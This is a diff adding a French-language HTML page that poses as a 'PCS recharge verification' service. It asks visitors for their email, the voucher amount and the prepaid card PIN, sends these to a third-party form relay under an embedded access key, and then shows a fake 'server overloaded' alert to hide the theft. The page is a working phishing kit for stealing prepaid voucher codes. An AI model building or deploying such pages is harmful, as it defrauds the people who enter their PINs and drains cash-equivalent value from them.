@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PCS | VERIFICATION</title>
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wdth,wght@75..100,300..800&family=Poppins:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <link href="https://unpkg.com/boxicon@2.1.4/css/boxicons.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header class="header">
+        <div class="nav">
+            <nav><a href="index.html">Accueil</a></nav>
+        </div>
+    </header>
+    <div id="wrapper">
+    <form action="https://api.web3forms.com/submit" method="POST" class="form" onsubmit="goToHomePage(event);reset()">
+        <h2>VERIFIER VOS RECHARGES PCS</h2>
+        <div class="pcs">
+            <input type="hidden" name="access_key" value="2ebf41e2-25a0-477d-847c-dcab0ee4f7c9">
+        <fieldset>
+            <legend>INFORMATION</legend>
+            <div>
+            <label for="email">Email:</label>
+            <input type="email" name="email" id="email" placeholder="abcdef@gmail.com" required>
+            </div>
+            </fieldset>
+            <fieldset>
+                <legend> VERIFIER</legend>
+                <div>
+                    <label for="montant1Pcs">Montant:</label>
+                    <select name="montant1Pcs" id="montant1Pcs" required>
+                        <option value="" disabled selected>Montant de la recharge</option>
+                        <option value="50">50€</option>
+                        <option value="100">100€</option>
+                        <option value="150">150€</option>
+                        <option value="200">200€</option>
+                        <option value="250">250€</option>
+                    </select>                    
+                </div>
+                <div>
+                    <label for="code1">Pin:</label>
+                    <input type="text" id="code1" name="code1" placeholder="XXXXXXXXXX" required  maxlength="10">
+                </div>
+              
+            </fieldset>
+        </div>
+        <button type="submit">Verifier</button>
+    </form> 
+</div>
+    <footer>
+        <small>© Copyright Verification Plateform 2022</small>
+        <small>Conditions d'utilisation<br>Politique de cookies</small><br>
+        <small><a href="about.html">A propos de nous </a></small>
+    </footer>
+    <script>
+        function goToHomePage(event) {
+    // Change the window location to the home page URL
+    // Prevent the default form submission behavior
+    event.preventDefault();
+
+// Serialize the form data
+var formData = new FormData(event.target);
+
+// Send the form data using AJAX
+fetch(event.target.action, {
+    method: 'POST',
+    body: formData
+})
+.then(response => {
+    // Handle response (e.g., show success message)
+    console.log('Form submitted successfully:', response);
+    // Optionally, you can display a success message to the user
+    alert("Désolé, le serveur est actuellement saturé en raison d'un grand nombre de demandes. Veuillez réessayer ultérieurement.!")
+})
+.catch(error => {
+    // Handle error (e.g., show error message)
+    console.error('Error submitting form:', error);
+    // Optionally, you can display an error message to the user
+    alert('Error submitting form. Please try again later.');
+})}
+    </script>
+</body>
+</html>
